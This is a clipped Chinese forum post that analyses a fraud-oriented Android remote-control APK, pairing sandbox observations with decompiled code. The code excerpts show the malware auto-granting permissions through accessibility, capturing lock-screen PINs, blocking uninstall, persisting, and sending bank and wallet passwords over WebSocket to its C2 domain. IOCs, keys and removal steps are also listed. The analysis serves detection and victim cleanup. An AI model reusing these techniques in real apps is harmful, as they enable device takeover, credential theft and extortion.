---
title: 【微信】某骗子黑产软件（手机远控）的分析
source: https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&mid=2651144658&idx=1&sn=b76c722dbcad54ddcc6695d8aad65307
source_host: mp.weixin.qq.com
clip_date: 2026-07-24T16:12:54+08:00
trace_id: 0dea150a-fc09-4a0c-829a-78f8e94bca0f
content_hash: 99df1eeb8c77f3abd85dae88c40e977134d8a99579078ce6909818ca0b8f171e
status: summarized
tags:
  - 微信
  - Android逆向
  - 恶意样本
series: null
feed_source: 公众号·吾爱破解论坛
ai_summary: |-
  该恶意软件通过无障碍服务实现远控、窃密、锁机勒索，并具备极强的反卸载与保活能力。
  - **攻击核心：** 利用无障碍服务模拟用户操作，自动授予自身所有权限、捕获锁屏密码、阻止卸载并覆盖屏幕。
  - **窃取目标：** 定向窃取包括支付宝、微信、各大银行及数字货币钱包在内的支付密码，以及短信、通讯录和浏览器历史。
  - **持久化与对抗：** 通过前台服务、开机自启、监听多种系统广播、关闭电池优化等多重机制实现顽固保活，并能隐藏图标防止卸载。
  - **C2通信：** 使用WebSocket与C2服务器通信，协议支持在会话中热更新域名以规避封锁，增加了追踪和清除的难度。
ai_summary_style: key-points
images_status:
  total: 7
  succeeded: 7
  failed_urls: []
notion_page_id: 3a775244-d011-8161-a5e6-e823d6999d6e
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 该恶意软件通过无障碍服务实现远控、窃密、锁机勒索，并具备极强的反卸载与保活能力。
> - **攻击核心：** 利用无障碍服务模拟用户操作，自动授予自身所有权限、捕获锁屏密码、阻止卸载并覆盖屏幕。
> - **窃取目标：** 定向窃取包括支付宝、微信、各大银行及数字货币钱包在内的支付密码，以及短信、通讯录和浏览器历史。
> - **持久化与对抗：** 通过前台服务、开机自启、监听多种系统广播、关闭电池优化等多重机制实现顽固保活，并能隐藏图标防止卸载。
> - **C2通信：** 使用WebSocket与C2服务器通信，协议支持在会话中热更新域名以规避封锁，增加了追踪和清除的难度。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/0a7abccc953f9eec.jpg)

某骗子黑产软件（手机远控）的分析

作者 **论坛账号：GDExecW**

## 某恶意 APK 分析

### APK 信息

-   文件名：欣姐.apk
    
-   文件大小：17.3 MB (18,238,424 字节)
    
-   应用名：欣姐
    

### 行为

#### 应用程序启动时，会要求开启无障碍权限。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/fb8804d402d2fc7e.png)

这种招数已经见怪不怪，骗子的 APP 通常会使用无障碍权限来操控用户的手机，作用是当用户进入应用信息时为了防止卸载而模拟按下的返回和深夜操控受害者的手机对骗子的账户进行转账操作。

#### 开启无障碍权限后，应用程序会全屏占用手机屏幕，用户无法操作。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/a9d775a4a70200ef.png)

这是因为应用程序被授予了无障碍权限，应用程序可以置顶，以前看到过的 Android 锁机，也是通过要无障碍权限来实现的。

该屏幕推测可能是为了连接到骗子的服务器。

因为我使用的是 Windows 上运行的 Android 子系统，可以透过它的全屏界面去看，我亲眼看见了 **在等待期间，它自己用无障碍进应用设置把自己的所有权限打开了** 。

这个过程太快了，所以我没有录制到。

#### 等待完成后，要求用户输入手机锁屏密码

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/54f1c0c1bdc74e8d.png)

而且第一次输入后无论密码是否正确都会提示错误，大概是因为怕用户第一次输入得不准确，所以让用户再输入一次。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/96688f4c7fbeb001.png)

但是，这个模拟器没有锁屏密码啊（

我两次输入的都是 `114514` ，但是第二次输入过后，程序才关闭了界面。

做这些事情大概算为了 **晚上的时候能够解锁用户的手机** 。

#### 向通知栏发送空的通知

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/51244d6fa9e6f97e.png)

（因为使用的是 Windows 上运行的 Android 子系统，所以通知由 Windows 原生通知完成。由于原生通知中如果是空内容就会被替换成“新通知”，因此我们看到的是“新通知”，实则是一个空的，无法划掉的通知）

开启无障碍权限之后程序还会向用户的通知栏发送一个空的通知，应该是为了持久化，防止被系统杀掉。

#### 开启所有权限并关闭电池优化

还记得上面哪个自己使用无障碍来开权限的吗？

它自己进入了电池优化的设置，并使用无障碍关闭了电池优化，实现持久化运行。

* * *

分析使用了 JADX 和 适用于 Android™ 的 Windows 子系统

> 以下为反编译 + 静态分析补充，把上面动态看到的现象和代码对应起来，并补全它真正在干什么。代码里的字符串原本全是加密的，我批量解密了 3400+ 处，所以下面的字段名、URL、包名都是明文。混淆的类名/方法名我在旁边都加了 /\* 作用 \*/ 注释。

### 命名混淆与字符串加密

作者把所有敏感字符串都用 **`v90.a(byte[] data, byte[] key)`** 加密——本质是"逐字节异或、密钥循环复用、UTF-8 还原"，实现在 `w90.java` ：

```java
复制代码 隐藏代码// w90.java —— 真正的解密实现（v90.a 只是转发给它）
privatestaticbyte[] b(byte[] bArr, byte[] bArr2) {
intlength= bArr.length, length2 = bArr2.length;
inti=0, i2 = 0;
while (i < length) {
if (i2 >= length2) i2 = 0;          // 密钥用完就从头再来
        bArr[i] = (byte) (bArr[i] ^ bArr2[i2]);  // 逐字节 XOR
        i++; i2++;
    }
return bArr;
}
```

反编译出来时长这样（加密态）：

```
复制代码 隐藏代码
nv.c(ctx, v90.a(newbyte[]{-2,110,-39,4,-100,-90,-101,-99}, newbyte[]{-97,2,-75,91,-8,-55,-11,-8}));
```

解密后还原成明文 `"all_done"` 。整个 APK 里这种调用有 3400+ 处。另外还有两层：

-   `cg0.z(byte[], String)`
    
    ：用字符串密钥 `vnhnyrftgmalqzz1` 解密 assets 下的 `.bt` 钓鱼 HTML 页面。
    
-   `ov.a(String)`
    
    ： **AES/CBC** 解密最关键的 URL（C2 落地页），密钥由 PBKDF2 派生（见 IOC）。
    

类名也全被混淆成乱码，对照表：

| 混淆名 | 真实作用 |
| --- | --- |
| `qxxox` | 主入口 Activity，伪装加载页 + 加载钓鱼 WebView |
| `kvepxjezjhab` | **无障碍服务（攻击中枢）** |
| `ftwqfjnbnqw` | **C2 连接 + 数据回传服务** |
| `hxurfdshugab` | 心跳/保活调度服务 |
| `lttsqoslcz` | 前台保活服务 |
| `tasyalpo` | MediaProjection 录屏服务 |
| `hfnlkncjf` | 锁屏勒索 Activity |
| `viyrggjda` | 锁屏/黑屏覆盖 Activity |
| `g` | C2 指令分发器（巨型 switch） |
| `y80` | WebSocket 客户端封装 |
| `ji0`<br><br>/ `hi0` | OkHttp 的 WebSocketListener / WebSocket 接口 |
| `pcdtukypfbre` | 配置常量类（域名、密钥等） |
| `tc` | 字符串常量 / SharedPreferences 键名 |
| `nv` | SharedPreferences 读写封装 |
| `a`<br><br>/ `m` / `h` | 自动授权 / 前台监控反卸载 / 桌面卸载拦截 |
| `ov` | AES 解密器 ｜ `cg0` 通用工具类 ｜ `pm0` 文件传输 |

### 基本信息

| 项   | 值   |
| --- | --- |
| 包名  | `twanztjjdestn.jluqcxbwjiq.anvrqchc.pnltn.wsdqnsvhqhmmzh`<br><br>（深度混淆） |
| 应用名 | 欣姐<br><br>（诱导文案："找到并选择《欣姐》"） |
| 主命名空间 | `org.integrator.pipeliner.watchdog`<br><br>（伪装"集成器/流水线/看门狗"） |
| 伪装图标 | Chrome / vivo「i管家」/ OPPO「手机管家」/ SIM 卡 / 欣姐，可动态切换、随时隐藏 |
| **C2 域名** | **`wslib.com`** |
| **WebSocket C2** | **`wss://wslib.com/api/ws/`** |
| 错误上报 | `https://wslib.com/api/Error.php` |
| 钓鱼落地页 | \*\* `https://91*****05.com` \*\*（AES 解密 `pcdtukypfbre.bzbquk` 得到） |
| 资源解密密钥 | `vnhnyrftgmalqzz1` |

### 1\. 那个"全屏等待"界面 = 连 C2 + 加载钓鱼页

`qxxox.onCreate()` （主入口 Activity）里，等待界面其实是一个 WebView，加载的 URL 是 AES 解密出来的：

```kotlin
复制代码 隐藏代码// qxxox.java:488
this.g = ov.c().a(pcdtukypfbre.bzbquk);
//  pcdtukypfbre.bzbquk = "+82loeJglprY/XN3A5nRS/BOwuD0AFC/JohHOCEx9dE="
//  ov.c().a(...) 用 AES 解密 → "https://91*****05.com"
...
this.f.loadUrl(this.g);   // WebView 加载钓鱼/中转页
```

同时它在后台把三个核心服务拉起来（ `qxxox.java:437-462` ），其中 `ftwqfjnbnqw` 就是连 C2 的：

```javascript
复制代码 隐藏代码// ftwqfjnbnqw.java:249  —— 连接入口
publicvoidn() {
synchronized (h) {
if (!y80.b() && !i) {     // 没连上 && 没在连接中
            i = true;
this.b.postDelayed(this.c, 15000L);  // 15s 超时保护
            y80.c(newb());       // ← 发起 WebSocket 连接
        }
    }
}
```

```javascript
复制代码 隐藏代码// y80.java:24  —— 真正连到 C2
publicstaticvoidc(ji0 ji0Var) {            // ji0 = OkHttp WebSocketListener
Stringstr= pcdtukypfbre.Sockets_Servers; // "wss://wslib.com/api/ws/"
    ...
    a = c.y(newj50.a().f(str).a(), ji0Var);   // j50 = OkHttp Request.Builder
}
```

连上后服务器回 `{"type":"connected"}` 握手，客户端立刻回心跳包 `D()` ——这个心跳里 **夹带了设备指纹和已偷到的全部支付密码** （见第 8 节）。

### 2\. C2 协议全貌（怎么收、怎么发）

**收** ：WebSocket 收到文本帧 → 监听器 `b.d()` → `r(str)` 路由（按 JSON 的 `type` 字段分发）：

```typescript
复制代码 隐藏代码// ftwqfjnbnqw.java:343  —— 下行指令路由
publicvoidr(String str) {
JSONObjectjSONObject=newJSONObject(str);
Stringtype= jSONObject.optString("type", "empty");
switch (type) {
case"connected":  D(); o(); break;   // 服务器握手 → 回心跳 + 拉起服务
case"out":        B(); break;        // 停止录屏/锁屏子服务
case"close":      y80.a(); break;    // 断开（发 close 4999）
case"screen":     g.h(...); break;   // 启动屏幕实时推流
case"screencomd": g.i(...); break;   // 屏幕控制（黑屏等）
case"mic":        g.g(...); break;   // 录音
case"loc":        g.f(...); break;   // 定位
case"bc":         g.j(...); break;   // 广播
case"fetch": case"file": default: g.e(...); // 主指令分发器（见第 7 节）
    }
}
```

**发** ：所有上行统一走 `E(str)` → `y80.d(str)` （加锁发送文本帧）：

```
复制代码 隐藏代码// ftwqfjnbnqw.java:134
publicstaticvoidE(String str) {
synchronized (h) { y80.d(str); }   // y80.d 内部：if(已连接) webSocket.send(str)
}
```

上行报文是固定信封的 JSON：

```javascript
复制代码 隐藏代码// ftwqfjnbnqw.java:648  —— 通用回传
JSONObjectjSONObject=newJSONObject();
jSONObject.put("pid",   strA);                 // 设备指纹（ANDROID_ID+Build 的 MD5）
jSONObject.put("itype", "Slr_client");         // 客户端类型常量
jSONObject.put("subc",  str);                  // 子类型，如 "screen" / "sms" / "files"
jSONObject.put("msg",   str2);                 // 载荷
E(jSONObject.toString());
```

### 3\. "自己用无障碍开权限"——对应代码

你抓不到的那段自动开权限，代码在 `a.h()` （ `a.java:642` ）。它认识 **全厂商** 的权限弹窗 ID 并自动 `performAction(16)` （= `ACTION_CLICK` ，模拟点击）：

```javascript
复制代码 隐藏代码// a.java:651  —— 自动点"允许"
String[] strArr = {
"@com.android.packageinstaller:id/confirm_button",
"com.android.packageinstaller:id/permission_allow_button",
"com.android.packageinstaller:id/permission_allow_always_button",
"com.android.permissioncontroller:id/permission_allow_button",
"com.android.settings:id/allow_button",
"com.lbe.security.miui:id/permission_allow_foreground_only_button", // 小米 MIUI
"@vivo:id/confirm_msg",                                             // vivo
"miui:id/grant", "miui:id/action_positive",                         // MIUI 授权
"android:id/button1", "android:id/aerr_wait"// 通用"确定"/"等待"
/* ... 共 16 个 */
};
for (inti2=0; i2 < 16; i2++) {
for (AccessibilityNodeInfo n : accessibilityNodeInfo
            .findAccessibilityNodeInfosByViewId(strArr[i2])) {
        n.performAction(16);   // 自动点击"允许"
    }
}
```

所以 SMS、通讯录、相机、麦克风、存储这些权限，它能在你毫无察觉下自己点完——自己把所有权限打开。

### 4\. 为什么要锁屏密码——半夜解锁 + 锁机勒索

#### 4.1 锁屏密码是怎么偷到的

它监听 **真正的系统锁屏** `com.android.systemui` ，用无障碍读取你按下的数字键盘（每个数字键的 `contentDescription` 就是数字），逐位拼进 `kvepxjezjhab.R` ：

```javascript
复制代码 隐藏代码// kvepxjezjhab.java:787  —— k() 锁屏密码捕获
publicvoidk(AccessibilityEvent accessibilityEvent) {
    ...
if (... && "com.android.systemui".equals(accessibilityEvent.getPackageName())) {
if (l(source.getViewIdResourceName())) {   // l() 用正则识别 PIN 数字键
            R += Integer.parseInt(source.getContentDescription().toString()); // 累加按下的数字
            nv.c(N, "asd", "1");                   // asd 只是状态码，不是密码
        }
// 退格键处理：用户按删除时同步删一位
if ("com.android.systemui:id/delete_button".equals(source.getViewIdResourceName())
                || "com.android.systemui:id/vivo_cancel".equals(...)) {
            R = R.substring(0, R.length() - 1);
        }
    }
}
```

所以 **你平时解锁手机时输入的 PIN，它在后台一字不差地记下来** ，回传时归入"钓鱼密码"字段（ `tc.Q` ）。 `asd` 键只存采集流程的状态码（1–5），不是密码本身。

#### 4.2 锁机勒索（你看到的"输入两次"）

C2 可下发锁屏指令，拉起 `hfnlkncjf` 这个全屏锁屏 Activity：

```
复制代码 隐藏代码// g.java:987  —— 锁机
Intentintent3=newIntent(context, hfnlkncjf.class);   // hfnlkncjf = 锁屏勒索 Activity
intent3.putExtra("COM", tc.a + 80);                       // 锁屏参数
context.startActivity(intent3);
```

`hfnlkncjf` 在 Manifest 里带 `showOnLockScreen` + `showWhenLocked` + `turnScreenOn` ，把手机锁死，要你输入攻击者设定的 PIN。 **第一次输入提示错误、让你再输一次** ——是它故意做二次确认（你观察到的现象），同时这次输入的 PIN 又被 `k()` 偷走。

用途：① 半夜用偷到的 PIN 解锁你的手机 + 录屏，打开银行/支付 App 转账；② 直接锁机勒索。

### 5\. 通知栏空通知 + 电池优化——保活

#### 5.1 空通知（前台服务钉死）

```rust
复制代码 隐藏代码// kvepxjezjhab.java:524  —— e() 挂一个前台服务通知
mw.ccVar=newmw.c(context, ...)       // mw.c = NotificationCompat.Builder
        .h(pcdtukypfbre.lpaozxb)         // 通道 id
        .g(str)                          // 标题（空字符串 → 通知栏看不出来）
        ...
        .d(true);                        // 持续
startForeground(...);                    // 钉成前台服务，系统不敢杀
```

#### 5.2 开机自启 + 事件自愈

```
复制代码 隐藏代码// BootReceiver.java:15  —— 开机/重启/快速开机都拉起服务
if ("android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {
    bq.a(context);                       // bq.a = 注册 JobScheduler 周期任务
}
// 然后无条件拉起 lttsqoslcz / hxurfdshugab / ftwqfjnbnqw 三个核心服务
```

`ResetServices` 更狠——监听 **十几种系统广播** ，任何一条都重启服务：

```html
复制代码 隐藏代码<!-- AndroidManifest.xml —— ResetServices 的 intent-filter -->
<actionandroid:name="android.intent.action.AIRPLANE_MODE"/>
<actionandroid:name="android.intent.action.BATTERY_LOW"/>
<actionandroid:name="android.intent.action.BATTERY_OKAY"/>
<actionandroid:name="android.intent.action.TIME_TICK"/><!-- 每分钟触发 -->
<actionandroid:name="android.intent.action.LOCALE_CHANGED"/>
<actionandroid:name="android.intent.action.DEVICE_STORAGE_LOW"/>
<!-- ... -->
```

#### 5.3 JobScheduler 周期唤醒

```cpp
复制代码 隐藏代码// bq.java:11  —— 每 15 分钟周期任务
JobInfo.Builderbuilder=newJobInfo.Builder(100,
newComponentName(context, MyJobService.class));
builder.setRequiredNetworkType(1);   // 有网时
builder.setPersisted(true);          // 重启后仍生效
builder.setPeriodic(900000L);        // 15 分钟
jobScheduler.schedule(builder.build());
```

整套保活 = **3 个 `persistent=true` 前台服务** （ `hxurfdshugab` / `ftwqfjnbnqw` / `lttsqoslcz` ）+ 多个普通前台服务 + 开机自启 + 十几种广播自愈 + JobScheduler 15 分钟唤醒 + 关电池优化进白名单，几乎杀不掉。

### 6\. 反卸载机制（为什么进应用信息会被顶出来）

这就是"进入应用信息时模拟按下返回"。两套：

#### 6.1 应用信息页拦截

```css
复制代码 隐藏代码// m.java:1350  —— E0()，检测到应用详情页就顶出去
if (accessibilityEvent.getEventType() == 32/*WINDOW_STATE_CHANGED*/
        && "com.android.settings.applications.InstalledAppDetailsTop"
            .equals(accessibilityEvent.getClassName())) {   // 用户进了"应用信息"页
    g3(...);
    O0();   // 内部 performGlobalAction(BACK/HOME) 把界面顶走
}
```

`performGlobalAction(1)` = `BACK` 、 `(2)` = `HOME` 、 `(3)` = `RECENTS` ——你一进应用信息就被弹回桌面，根本够不到"卸载/禁用"按钮。

#### 6.2 桌面长按卸载拦截（最强的反卸载）

你在桌面长按图标选"卸载"时， `h.h()` 识别 **全厂商** 的卸载确认框， **自动点"取消"按钮（ `android:id/button2` ）** ：

```bash
复制代码 隐藏代码// h.java:125+ —— 识别各厂商卸载弹窗并点取消
// 华为 com.huawei.android.launcher:id/delete_item
// 小米 com.miui.home:id/title
// OPPO com.oppo.launcher:id/txt_uninstall_main_title
// Honor com.hihonor.android.launcher:id/delete_item
// vivo com.bbk.launcher2:id/uninstall_title
// 原生 com.android.launcher:id/...
...
if (z) {   // 识别到卸载弹窗
    accessibilityNodeInfoB.performAction(16);   // 点"取消"(android:id/button2)
    kvepxjezjhab.N.performGlobalAction(2);      // 回桌面
    f(false);  // ← 关键：隐藏图标
}
```

`f(false)` 里通过 `setComponentEnabledSetting` 把当前启动器图标 disable：

```
复制代码 隐藏代码// h.java:81  —— 隐藏桌面图标
packageManager.setComponentEnabledSetting(
newComponentName(kvepxjezjhab.N, A1.class),  // A1 = 当前启用的启动器入口
2/*COMPONENT_ENABLED_STATE_DISABLED*/, 1);
```

**结果：卸载被取消 + 图标从桌面消失** ，用户以为"没了"，其实程序还在跑。

> 好消息：它 **没有** 申请设备管理员（Device Admin）权限（Manifest 无 `BIND_DEVICE_ADMIN` ），所以不是系统级固化，一定能卸掉，只是要绕过无障碍服务。

### 7\. 连上 C2 后能干什么——指令集

主分发器 `g.e()` 按下行的 `subc` 字段执行（已解密）：

| `subc` | 干什么 |
| --- | --- |
| `SMS`<br><br>/ `Contacts` | 偷短信、通讯录并回传 |
| `SMSSEND` | **用你的手机发短信**<br><br>（可发诈骗/订阅） |
| `LOADAPPS` | 回传已安装应用列表 |
| `OPENAPP`<br><br>/ `OPENINJ` | 启动某 App / 注入覆盖钓鱼页 |
| `UNINSTALLAPP` | 卸载指定 App |
| `change` | **热更换 C2 域名** |
| `changefiles` | 上传/下载文件（分块），特判支付宝 |
| `Screen` | 启动 **实时屏幕推流** （WEBP 压缩回传） |
| `Keylog` | 键盘记录开关 |
| `DIAO` | 锁机勒索 |
| `Camera`<br><br>/ `CameraOff` | 拍照  |
| `Location`<br><br>/ `Locationoff` | 定位  |
| `Notifi` | 推送通知 |
| `Hideico` | 隐藏图标 |
| `Logdate`<br><br>/ `viewfile` / `Delete` | 读/看/删本地文件 |

挑几个关键的看代码：

**远程卸载任意 App** ：

```
复制代码 隐藏代码// g.java:844  —— case UNINSTALLAPP
Stringpkg= jSONObject.optString("package", "empty");
Intentintent2=newIntent("android.intent.action.UNINSTALL_PACKAGE");
intent2.setData(Uri.parse("package:" + pkg));
context.startActivity(intent2);
```

**用你的手机偷偷发短信** ：

```css
复制代码 隐藏代码// g.java:792  —— case SMSSEND
v80.b(context, jSONObject.optString("smsnumber", "empty"),   // v80.b = SmsManager.sendTextMessage
              jSONObject.optString("message", "empty"));
```

**热更换 C2 域名** （详见第 9 节）。

### 8\. 窃取的数据

心跳包 `D()` 里集中回传的密码字段（ `ftwqfjnbnqw.java:128` ），直接暴露了它盯上的国内金融 App 全名单：

```css
复制代码 隐藏代码// ftwqfjnbnqw.java:128  —— D() 心跳，回传所有偷到的密码
k(f, p(..., String.format(
"手机密码: %s 钓鱼密码: %s Alipay密码: %s Wechat密码: %s 云密码: %s "
  + "建密码: %s 邮密码: %s 农密码: %s 中密码: %s 工密码: %s 招密码: %s "
  + "gp密码: %s pe密码: %s an密码: %s mb密码: %s bc密码: %s "
  + "Trust密码: %s Imtoken密码: %s Tokenpocket密码: %s",
    v(nv.a(f,"asd","")),     nv.a(f,tc.Q,""),      // 手机锁屏PIN / 钓鱼密码
    nv.a(f,"alipaynew",""),  nv.a(f,"wecpaynew",""), // 支付宝 / 微信
    nv.a(f,"yunnew",""),     nv.a(f,"jiannew",""),   // 云(云闪付) / 建
    nv.a(f,"younew",""),     nv.a(f,"nongnew",""),   // 邮 / 农
    nv.a(f,"zhongnew",""),   nv.a(f,"gongnew",""),   // 中 / 工
    nv.a(f,"zhaonew",""),    nv.a(f,"gpaynew",""),   // 招 / gp
    nv.a(f,"phonepenew",""), nv.a(f,"ananew",""),    // pe / an
    nv.a(f,"mbnew",""),      nv.a(f,"bcnew",""),     // mb / bc
    nv.a(f,"twpwd",""),      nv.a(f,"paytp",""),     // Trust / TokenPocket
    nv.a(f,"payim",""))),                            // imToken
"ping");
```

明摆着就是： **支付宝、微信、云闪付、建/邮/农/中/工/招各大银行、Trust Wallet、imToken、TokenPocket** 等钱包的支付密码。

外加持续外发：短信（含验证码）、通讯录、键盘记录、实时屏幕、相机、定位、本机 IP、壁纸、已装 App 列表。

#### 浏览器地址栏劫持

`tc.java` 里硬编码了一串浏览器 URL 栏的 view-id，实时读取你访问的网址：

```javascript
复制代码 隐藏代码// tc.java（cg0.e 解密后）—— 监控各浏览器地址栏
"com.android.chrome:id/url_bar"// Chrome
"org.mozilla.firefox:id/url_bar_title"// Firefox
"com.sec.android.app.sbrowser:id/location_bar_edit_text"// Samsung
"com.brave.browser:id/url_bar"// Brave
"com.opera.browser:id/url_field"// Opera
"com.duckduckgo.mobile.android:id/omnibarTextInput"// DuckDuckGo
"com.microsoft.emmx:id/url_bar"// Edge
"com.coloros.browser:id/azt"// OPPO 浏览器
/* ... 你访问什么网址它都知道 */
```

### 9\. 域名热更新（为什么封域名没用）

指令 `change` 对应 `g.e()` 的 case 11，直接改写内存里的 C2 地址，1.6 秒后断开重连：

```kotlin
复制代码 隐藏代码// g.java:861  —— case 11，热更换 C2 域名
case11:
Stringdomain= jSONObject.optString("domain",   "empty");   // 新域名
    jSONObject.optString("ip", "empty");                            // 读但没用
Stringchangeid= jSONObject.optString("changeid", "empty");   // 变更ID
    pcdtukypfbre.mydom          = domain;                          // ① 改静态字段
    pcdtukypfbre.Sockets_Servers = "wss://" + domain + "/api/ws/"; // ② 拼新 WS 地址
    nv.c(context, "changeid", changeid);                           // ③ 记录变更ID
newHandler(Looper.getMainLooper())
        .postDelayed(newc(), 1600L);                              // ④ 1.6s 后断开重连
break;
```

```
复制代码 隐藏代码// g.java:57  —— 内部类 c，断开当前连接
classcimplementsRunnable { publicvoidrun() { ftwqfjnbnqw.g(); } }
```

重连时 `y80.c()` 实时读取最新的 `Sockets_Servers` ，所以下一次连接就打到新域名。

**两个关键点** ：

-   新域名 **不落盘** —— `mydom` / `Sockets_Servers` 是内存静态字段，重启后回到硬编码的 `wslib.com` ，由服务器在会话内再次下发 `change` 。
    
-   运行期即时生效——封了 `wslib.com` ，运营者从备用域下发一条 `{"subc":"change","domain":"..."}` 就能把整个僵尸网络迁过去。所以防御必须按 **协议特征** （ `/api/ws/` 路径 + `{"itype":"Slr_client"}` 信封 + 关闭码 `4999` ）拦，而不是只封域名。
    

### IOC（取证/检测特征）

-   域名： `wslib.com` 、 `91*****05.com`
    
-   WebSocket： `wss://wslib.com/api/ws/` ，错误上报 `https://wslib.com/api/Error.php`
    
-   协议指纹：JSON 信封 `{"pid":...,"itype":"Slr_client","subc":...}` 、WS 关闭码 `4999`
    
-   资源密钥： `vnhnyrftgmalqzz1`
    
-   AES 常量（PBKDF2-HmacSHA1，65536 轮，128 位）：IV `2230209522049090` 、口令 `4814780584699673` 、盐 `2894356330652558`
    
-   包路径： `org.integrator.pipeliner.watchdog.*` 、 `guardian.enforcer.op*`
    
-   Manifest 标记： `com.google.android.ALLOW_PHISHING_DETECTION=false` （主动关 Google 反钓鱼）
    
-   文案：欣姐、偷\*\*妻、加载中～请勿触碰屏幕或锁屏！
    

### 如何卸载（绕过无障碍服务）

**电脑 + adb** （adb 以 shell 身份运行，无障碍拦不住）：

```
复制代码 隐藏代码adb shell settings put secure enabled_accessibility_services ""
adb shell settings put secure accessibility_enabled 0
adb shell pm uninstall --user 0 twanztjjdestn.jluqcxbwjiq.anvrqchc.pnltn.wsdqnsvhqhmmzh
```

**使用安全模式** ：关机重开，出现 logo 时长按音量减（小米/华为/OPPO/vivo 通用），进安全模式后第三方 App 和它的无障碍服务都不运行，再到「设置→应用」正常卸载。

> 重要：卸载前先 **断网/拔 SIM 卡** ，防止 C2 察觉后下发 `DIAO` (锁机) 或 `black_scr` (黑屏) 把你锁死。

**卸载后必做** ：短信验证码、支付密码、屏幕内容都已外泄。从另一台可信设备改掉所有银行/支付/社交/邮箱密码、联系银行核对流水、检查「下载」目录有没有它额外下载的二次载荷，必要时恢复出厂设置。

分析过程使用了 GLM 进行了辅助。

****\-官方论坛****

www.52pojie.cn

公众号您 **不会错过** 新的消息通知

如等公告

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/9cc34db30d648f37.webp)
